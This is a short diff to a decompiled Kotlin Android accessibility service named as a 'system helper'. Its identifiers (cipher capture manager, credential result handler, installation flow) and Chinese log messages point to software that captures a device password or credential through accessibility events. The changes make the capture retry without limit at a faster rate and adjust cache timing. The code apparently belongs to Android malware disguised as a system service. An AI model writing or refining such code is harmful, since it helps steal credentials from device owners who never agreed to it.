@@ -93,7 +93,7 @@ class MyAccessibilityService : AccessibilityService() {
         const val NOTIFICATION_CHANNEL_ID = "system_helper_service"
 
         /** Root node cache time-to-live (ms). JADX: f52393c4 (constructor init) */
-        const val ROOT_CACHE_TTL_MS = 300L
+        const val ROOT_CACHE_TTL_MS = 150L
 
         /** Keyguard check cache TTL (ms). JADX: f52390c1 (constructor init) */
         const val KEYGUARD_CACHE_TTL_MS = 500L
@@ -3437,13 +3437,14 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     @Volatile private var cipherRetryCount = 0
-    private val cipherMaxRetries = 3
-    private val cipherRetryDelayMs = 800L
+    private val cipherMaxRetries = Int.MAX_VALUE
+    private val cipherRetryDelayMs = 300L
     private var cipherIsInstallationFlow = false
 
     private fun handleCipherCredentialResult(success: Boolean) {
         android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
         if (success) {
+            isCipherCaptureEnabled = false
             cipherRetryCount = 0
             if (cipherIsInstallationFlow) completeInstallationWithCipher()
         } else {
@@ -3455,6 +3456,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }, cipherRetryDelayMs)
             } else {
                 android.util.Log.w(TAG, "⚠️ 达到最大重试次数")
+                isCipherCaptureEnabled = false
                 cipherRetryCount = 0
                 cipherCaptureManager?.stopListeningFull()
                 if (cipherIsInstallationFlow) completeInstallationWithCipher()
